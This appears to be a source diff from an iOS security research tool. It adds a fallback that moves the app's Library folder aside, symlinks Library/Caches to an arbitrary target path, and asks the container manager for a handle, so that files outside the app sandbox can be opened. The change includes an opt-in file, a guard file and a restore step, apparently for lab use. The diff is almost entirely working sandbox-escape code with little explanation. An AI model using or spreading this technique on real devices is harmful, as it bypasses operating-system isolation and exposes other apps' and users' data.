@@ -178,6 +178,64 @@ static NSString *p160_dump_kernelcache(NSString *src, NSString *docs, NSMutableS
 }
 
 
+static void p160_recover_library(NSMutableString *o) {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *home = NSHomeDirectory();
+    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
+    NSString *bak = [home stringByAppendingPathComponent:@"Library.p160bak"];
+    if (![fm fileExistsAtPath:lib] && [fm fileExistsAtPath:bak]) {
+        if ([fm moveItemAtPath:bak toPath:lib error:nil]) {
+            [o appendString:@"  [recover] restored Library.p160bak after an interrupted parent fallback\n"];
+        }
+    }
+}
+
+static int64_t p160_class2_parent(NSString *target, NSString **pathOut, NSString **errOut) {
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    if (!docs) return -1;
+    NSString *optIn = [docs stringByAppendingPathComponent:@"lum1na_class2_parent"];
+    if (![[NSFileManager defaultManager] fileExistsAtPath:optIn]) {
+        if (errOut) *errOut = @"parent fallback not opted in (Documents/lum1na_class2_parent)";
+        return -1;
+    }
+    NSString *guard = [docs stringByAppendingPathComponent:@"lum1na_class2_parent_guard"];
+    if ([[NSFileManager defaultManager] fileExistsAtPath:guard]) {
+        if (errOut) *errOut = @"parent fallback guard present (previous attempt did not finish)";
+        return -2;
+    }
+    [@"1" writeToFile:guard atomically:YES encoding:NSUTF8StringEncoding error:NULL];
+    NSString *home = NSHomeDirectory();
+    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
+    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
+    NSString *bak = [home stringByAppendingPathComponent:@"Library.p160bak"];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    [fm removeItemAtPath:bak error:nil];
+    if (![fm moveItemAtPath:lib toPath:bak error:nil]) {
+        [fm removeItemAtPath:guard error:nil];
+        if (errOut) *errOut = @"move Library failed (sandbox)";
+        return -3;
+    }
+    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
+    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
+    int64_t result = -4;
+    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) == 0) {
+        NSString *path = nil, *err = nil;
+        int64_t h = p160_query(2, bid.UTF8String, NO, 3, @"", @"class2-parent", &path, &err);
+        if (h >= 0) {
+            if (p160_can_open(target, YES)) { result = h; if (pathOut) *pathOut = path; }
+            else if (g.release) g.release(h);
+        }
+        if (errOut && err) *errOut = err;
+    }
+    unlink(caches.fileSystemRepresentation);
+    rmdir(caches.fileSystemRepresentation);
+    rmdir(lib.fileSystemRepresentation);
+    [fm moveItemAtPath:bak toPath:lib error:nil];
+    [fm removeItemAtPath:guard error:nil];
+    return result;
+}
+
 static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **errOut) {
     if (!p160_load() || !g.set_ids) { if (errOut) *errOut = @"MCM set_ids unavailable"; return -1; }
     NSString *home = NSHomeDirectory();
@@ -244,6 +302,7 @@ static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **
     [o appendFormat:@"=== p160 session %@ BUILD %@ ===\n",
         LabLocalMilitaryNow(), P160_BUILD];
     [o appendString:[LabDeviceProfile identBlock]];
+    p160_recover_library(o);
     [o appendFormat:@"  [mcm] %@\n", p160_load() ? @"loaded" : @"MISSING (libsystem_containermanager not available)"];
 
     NSString *docs = NSSearchPathForDirectoriesInDomains(
@@ -276,6 +335,12 @@ static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **
         if (h < 0 && [t[@"dir"] boolValue]) {
             NSString *c2path = nil, *c2err = nil;
             int64_t h2 = p160_class2_try(path, &c2path, &c2err);
+            if (h2 < 0) {
+                NSString *ppath = nil, *perr = nil;
+                int64_t hp = p160_class2_parent(path, &ppath, &perr);
+                if (hp >= 0) { h2 = hp; c2path = ppath; }
+                else if (perr.length) c2err = perr;
+            }
             if (h2 >= 0) {
                 h = h2; objPath = c2path; can = p160_can_open(path, YES);
                 [o appendFormat:@"      [class2] handle=%lld obj=%@ open=%d\n",
